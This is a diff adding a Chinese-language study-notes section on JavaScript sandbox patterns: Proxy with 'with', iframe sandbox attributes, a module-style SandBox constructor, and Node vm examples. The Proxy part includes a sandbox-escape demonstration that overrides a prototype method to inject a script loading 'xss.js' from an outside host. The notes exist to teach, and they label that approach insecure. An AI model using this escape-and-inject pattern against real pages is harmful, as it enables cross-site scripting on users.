@@ -1997,6 +1997,8 @@
    - [“浅尝”JavaScript设计模式](https://juejin.im/post/5eb3be806fb9a043426818c7#heading-5)
    - [proxy-polyfill](https://github.com/linsk1998/proxy-polyfill/blob/master/proxy.js)
    - [进阶必读：深入理解 JavaScript 原型](https://juejin.cn/post/6901494216074100750)
+   - [JS沙箱模式实例分析](https://www.jb51.net/article/122831.htm)
+   - [说说JS中的沙箱](https://segmentfault.com/a/1190000020463234)
 
 2. 详解：
 
@@ -3735,7 +3737,196 @@
         console.log(a)
         ```
 
+    * 沙箱模式
 
+      * 概念
+
+        沙箱就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，Chrome 中的每一个标签页都是一个沙箱（sandbox）。渲染进程被沙箱（Sandbox）隔离，网页 web 代码内容必须通过 IPC 通道才能与浏览器内核进程通信，通信过程会进行安全的检查。沙箱设计的目的是为了让不可信的代码运行在一定的环境中，从而限制这些代码访问隔离区之外的资源。
+
+      * 使用场景
+
+        1. jsonp：如果不信任jsonp中的数据，可以通过创建沙箱的方式来解析获取数据
+        2. 执行第三方js
+        3. 在线代码编辑器
+        4. vue的服务端渲染：vue的服务端渲染实现中，通过创建沙箱执行前端的bundle文件
+        5. vue模板中表达式计算：vue模板中表达式的计算被放在沙盒中，只能访问全局变量Math 和 Date
+
+      * 实现沙箱
+
+        1. proxy(不安全)
+
+          ```js
+          function compileCode (src) {  
+            src = `with (exposeObj) { ${src} }`
+            return new Function('exposeObj', src)
+          }
+
+          function proxyObj(originObj){
+              let exposeObj = new Proxy(originObj,{
+                  has:(target,key)=>{
+                      if(["console","Math","Date"].indexOf(key)>=0){
+                          return target[key]
+                      }
+                      if(!target.hasOwnProperty(key)){
+                          throw new Error(`Illegal operation for key ${key}`)
+                      }
+                      return target[key]
+                  },
+              })
+              return exposeObj
+          }
+
+          function createSandbox(src,obj){
+            let proxy = proxyObj(obj)
+            compileCode(src).call(proxy,proxy) //绑定this 防止this访问window
+          }
+          ```
+
+          通过访问原型链的方式，实现了沙箱逃逸
+          ```js
+          const testObj = {
+              value:1,
+              a:{
+                  b:{c:1}
+              }
+          }
+          createSandbox("value='haha';console.log(a)",testObj)
+          a.b.__proto__.toString = ()=>{
+              var script = document.createElement("script");
+              script.src = "http://.../xss.js"
+              script.type = "text/javascript";
+              document.body.appendChild(script)
+          }
+          ```
+
+        2. iframe
+
+          ```html
+          <iframe sandbox src="..."></iframe>
+          ```
+
+          会带来一些限制：
+
+          1. script脚本不能执行
+          2. 不能发送ajax请求
+          3. 不能使用本地存储，即localStorage,cookie等
+          4. 不能创建新的弹窗和window
+          5. 不能发送表单
+          6. 不能加载额外插件比如flash等
+
+          可对iframe配置：
+
+          1. allow-forms:允许提交表单
+          2. allow-scripts:允许执行脚本
+          3. allow-same-origin:允许同域请求
+          4. allow-top-navigation:允许window.top跳转页面
+          5. allow-popups:允许弹出新窗口，window.open，target="_blank"
+          6. allow-pointer-lock:允许锁定鼠标
+
+        3. 其它
+
+          ```js
+          //SandBox(['module1,module2'],function(box){});
+          /*
+          *
+          *
+          * @function
+          * @constructor
+          * @param []  array   模块名数组
+          * @param callback function 回调函数
+          * 功能：新建一块可用于模块运行的环境(沙箱)，自己的代码放在回调函数里，且不会对其他的个人沙箱造成影响
+          和js模块模式配合的天衣无缝
+          *
+          * */
+          function SandBox() {
+            //私有的变量
+            var args = Array.prototype.slice.call(arguments),
+                callback = args.pop(),
+                //模块可以作为一个数组传递，或作为单独的参数传递
+                modules = (args && typeof args[0] == "string") ? args : args[0];
+            //确保该函数作为构造函数调用
+            if (!(this instanceof SandBox)) {
+              return new SandBox(modules,callback);
+            }
+            //不指定模块名和“*”都表示“使用所有模块”
+            if (!modules || modules[0] === "*") {
+              for(value in SandBox.modules){
+                modules.push(value);
+              }
+            }
+            //初始化所需要的模块（将想要的模块方法添加到box对象上）
+              for (var i = 0; i < modules.length; i++) {
+                SandBox.modules[modules[i]](this);
+              }
+            //自己的代码写在回调函数里，this就是拥有指定模块功能的box对象
+            callback(this);
+          }
+          SandBox.prototype={
+            name:"My Application",
+            version:"1.0",
+            getName:function() {
+              return this.name;
+            }
+          };
+          /*
+          * 预定义的模块
+          *
+          * */
+          SandBox.modules={};
+          SandBox.modules.event=function(box){
+            //私有属性
+            var xx="xxx";
+            //公共方法
+            box.attachEvent=function(){
+              console.log("modules:event------API:attachEvent")
+            };
+            box.dettachEvent=function(){
+            };
+          }
+          SandBox.modules.ajax=function(box) {
+            var xx = "xxx";
+            box.makeRequest = function () {
+            };
+            box.getResponse = function () {
+            };
+          }
+          SandBox(['event','ajax'],function(box){
+            box.attachEvent();
+          })
+          ```
+
+      * nodejs沙箱
+
+        1. vm
+
+          缺陷：可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行
+          ```js
+          const vm = require('vm');
+          const x = 1;
+          const sandbox = { x: 2 };
+          vm.createContext(sandbox); // Contextify the sandbox.
+
+          const code = 'x += 40; var y = 17;';
+          vm.runInContext(code, sandbox);
+
+          console.log(sandbox.x); // 42
+          console.log(sandbox.y); // 17
+
+          console.log(x); // 1;   y is not defined.
+          ```
+
+        2. tsw框架
+
+          ```js
+          const vm = require('vm');
+          const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆
+          ...
+          if (opt.jsonpCallback) {
+              code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;
+              obj = new SbFunction(code)();
+          } 
+          ...
+          ```
 
 
 ### 变量的解构赋值
